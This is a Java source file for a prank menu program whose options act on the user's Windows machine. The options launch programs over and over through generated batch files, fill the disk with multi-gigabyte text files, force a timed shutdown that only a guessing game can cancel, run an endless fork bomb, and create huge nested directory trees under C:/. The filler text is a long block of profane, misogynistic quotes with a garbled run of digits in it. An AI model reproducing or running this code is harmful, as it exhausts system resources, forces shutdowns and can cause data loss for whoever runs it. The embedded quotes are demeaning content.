package ca.qc.test.performance;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Random;
import java.util.Scanner;

public class Main {
    public static void main(String[] args) throws InterruptedException, IOException {
        Scanner choice = new Scanner(System.in);
        for (String s1 : Arrays.asList("Enter the number corresponding to the game", "1 - Say bye to your computer", "2 - Huge virus download", "3 - Romanian roulette (computer edition)", "4 - Fork Bomb!", "5 - Infnite Undeletable Files")) {
            System.out.println(s1);
        }
        String regex = "\\d+";
        String game = choice.nextLine();
        if (game.matches(regex)) {
            switch (Integer.parseInt(game)) {
                case 1:
                    System.out.println("Dear computer, it was fun while you lasted");
                    System.out.println("Activate DemonTime? (type y/n)");
                    Scanner demonTime = new Scanner(System.in);
                    char yesOrNo = demonTime.nextLine().charAt(0);
                    Thread.sleep(1000);
                    System.out.println("Take a deep breath in");
                    Thread.sleep(1000);
                    playAudio("BreatheAir.mp4");
                    Thread.sleep(2000);
                    sayByeToComputer(yesOrNo == 'y');
                    break;
                case 2:
                    System.out.println("You asked for it!");
                    System.out.println("Activate fill storage? (type y/n)");
                    Scanner fillStorage = new Scanner(System.in);
                    char fill = fillStorage.nextLine().charAt(0);
                    Thread.sleep(1000);
                    System.out.println("Open Windows Explorer and click on PC");
                    Thread.sleep(1000);
                    System.out.println("Right click and refresh from time to time");
                    Thread.sleep(1000);
                    System.out.println("And don't forget to...");
                    Thread.sleep(1000);
                    playAudio("BreatheAir.mp4");
                    Thread.sleep(2000);
                    HVD(fill == 'y');
                    break;
                case 3:
                    System.out.println("Let's play a (not) funny game!");
                    System.out.println("You need to guess a number from 1 to 9999");
                    romanianRoulette();
                    break;
                case 4:
                    System.out.println("Be very careful! This is the fork bomb!");
                    Thread.sleep(1000);
                    System.out.println("Do not run this code unless you know what a fork bomb is");
                    Thread.sleep(2000);
                    System.out.println("Run this on a virtual machine and not your actual computer!");
                    Thread.sleep(1000);
                    System.out.println("Are you sure to proceed?");
                    Scanner forkBomb = new Scanner(System.in);
                    char fork = forkBomb.nextLine().charAt(0);
                    forkAttack(fork == 'y');
                    break;
                case 5:
                    System.out.println("Be very careful! These are undeletable files!");
                    Thread.sleep(1000);
                    String alph = "abcdefghijklmnopqrstuvwxyz";
                    for (int i = 0; i < alph.length(); i++) {
                        repeat(alph.charAt(i));
                        System.out.println("Try to delete the files created in C:/ in file explorer ;)");
                    }
                    break;
                case 6:
                    whatASave();
                    break;
                default:
                    System.out.println("Enter a valid number!");
                    Thread.sleep(1000);
                    System.out.println("I'm watching!");
            }
        }
    }

    public static void repeat(char c) throws IOException {
        String possibiliteDeux = "C:/" + c;
        for (int h = 0; h < 1000000; h++)
            for (int z = 0; z < h; z++) {
                possibiliteDeux += "/" + h;
                Files.createDirectories(Paths.get(possibiliteDeux));
            }
    }

    public static void sayByeToComputer(boolean demonTime) throws InterruptedException, IOException {
        File file = new File("filename.bat");
        int reps = 25;
        try (Writer writer = new BufferedWriter(new OutputStreamWriter(
                new FileOutputStream(file.getName()), StandardCharsets.UTF_8))) {
            for (int i = 0; i < reps; i++) {
                writer.write("start AUUGHHH!.wav");
                writer.write("\n");
                writer.write("start chrome.exe yahoo.com");
                writer.write("\n");
                writer.write("start explorer.exe");
                writer.write("\n");
                writer.write("start msedge.exe");
                writer.write("\n");
            }
        }
        if (demonTime) {
            reps *= reps;
            for (int i = 0; i < reps; i++)
                execute(file);
        } else
            execute(file);
    }

    public static void execute(File file) throws InterruptedException, IOException {
        Process p = Runtime.getRuntime().exec(file.getPath());
        p.waitFor();
    }

    public static void HVD(boolean fill) throws IOException {
        int reps = 1000000;
        int repeatProcess = 1;
        if (fill)
            repeatProcess = 100;
        for (int h = 0; h < repeatProcess; h++) {
            try (BufferedWriter writer = new BufferedWriter(new FileWriter("textFile" + h + ".txt"))) {
                for (int i = 0; i < reps; i++) {
                    writer.write("“Let’s say I’m working at a company… I work, I work, I work, I become a manager. I’m on one hundred and fifty thousand a year, I got a company BMW, and I wear a suit, and everyone at my job does as I say. By all measures, I’m a success now.\n" +

                            "But here’s the truth, when I leave that company, no one gives a f*ck about me. I’m a nobody outside of that one building where I’m a little bit important.\n" +

                            "My wife doesn’t wanna suck my d*ck because I’m fat… I got a BMW… I know h*es with BMWs… I don’t even consider that a car… That’s not a luxury car, that’s f*cking basic.”\n" +

                            "“Success for a man actually comes in many realms. It’s actually nothing to do with being good at your job. Having money, yeah… You don’t have to be good at your job to have money.”\n" +

                            "“How to be successful as a man… First thing, you need freedom ‘cus you ain’t a man if you’re not free. If you’re working your ass of, you’re a slave. And you may sit there and go ‘I’m not a slave, I get paid really well.’\n" +

                            "Well, listen, the slaves got free food and free shelter in exchange for work. Now, all they’ve done is, got rid of the food and shelter deal, give you dollars which you spend on food and shelter, and you basically have nothing left, so you’re still a f*cking slave. So, first thing you need is freedom. If you’re not free, you’re not a man.”\n" +

                            "“Next thi32165465495165196854964596854196596, who are you talking to. Who are these people, who will answer your phone calls… I can call one of many multi-millionaires and when they see my name, they’re gonna pick up the phone.\n" +

                            "They’re gonna be like ‘oh sh*t, Tate’… They’re gonna stop their conversation and be like ‘wow, f*ck, Tate wants me. What’s up, Tate?’ Because they know I don’t call for no bullsh*t. They’ll be like ‘f*ck… money phone’s ringing.'”");
                    if (i % (reps / 25) == 0)
                        System.out.println("The virus is at " + 100 * i / reps + " % completion");
                }
            }
            System.out.println("Virus " + (h + 1) + " finished!");
        }
        System.out.println("Each virus takes approximately 1.80 GB");
    }

    public static void romanianRoulette() throws IOException, InterruptedException {
        File file = new File("filename.bat");
        int reponse = new Random().nextInt(9999);
        try (Writer writer = new BufferedWriter(new OutputStreamWriter(
                new FileOutputStream(file.getName()), StandardCharsets.UTF_8))) {
            writer.write("shutdown /s /t 30 -c \"YOU HAVE 30 SECONDS TO ESCAPE THE MATRIX STARTING NOW!\"");
        }
        execute(file);
        Scanner scanner = new Scanner(System.in);
        boolean matrixEscaped = false;
        while (!matrixEscaped) {
            try {
                int attempt = scanner.nextInt();
                if (attempt == reponse) {
                    matrixEscaped = true;
                    whatASave();
                } else {
                    if (attempt < reponse)
                        System.out.println("Higher!");
                    else
                        System.out.println("Lower!");
                }
            } catch (RuntimeException | InterruptedException e) {
                throw new RuntimeException(e);
            }
        }
    }

    public static void forkAttack(boolean go) throws IOException {
        if (go)
            while (true)
                Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "ForkBomb"});
    }

    public static void whatASave() throws IOException, InterruptedException {
        File file = new File("filename.bat");
        try (Writer writer = new BufferedWriter(new OutputStreamWriter(
                new FileOutputStream(file.getName()), StandardCharsets.UTF_8))) {
            writer.write("shutdown -a");
        }
        Runtime.getRuntime().exec(file.getAbsolutePath());
        System.out.println("You have successfully escaped the matrix!!!");
        Thread.sleep(1000);
        System.out.println("Relax");
        Thread.sleep(1000);
        System.out.println("And...");
        Thread.sleep(2000);
        playAudio("AndrewAte.mp4");
    }

    public static void playAudio(String path) throws IOException, InterruptedException {
        File file = new File("filename.bat");
        try (Writer writer = new BufferedWriter(new OutputStreamWriter(
                new FileOutputStream(file.getName()), StandardCharsets.UTF_8))) {
            writer.write(path);
        }
        execute(file);
    }

    private static final ArrayList<Integer> listToHaveTwo = new ArrayList<>();

    public static void findPrimeNumbers() throws IOException, InterruptedException {
        listToHaveTwo.add(1);
        for (int j = 2; j < 1000000; j++)
            listToHaveTwo.add(nextPrime(j));
    }

    public static int nextPrime(int n) {
        boolean isPrime;
        n++;
        while (true) {
            int sqrt = (int) Math.sqrt(n);
            isPrime = true;
            for (int i = 2; i <= sqrt; i++)
                if (n % i == 0) {
                    isPrime = false;
                    break;
                }
            if (isPrime)
                return n;
            else
                n++;
        }
    }
}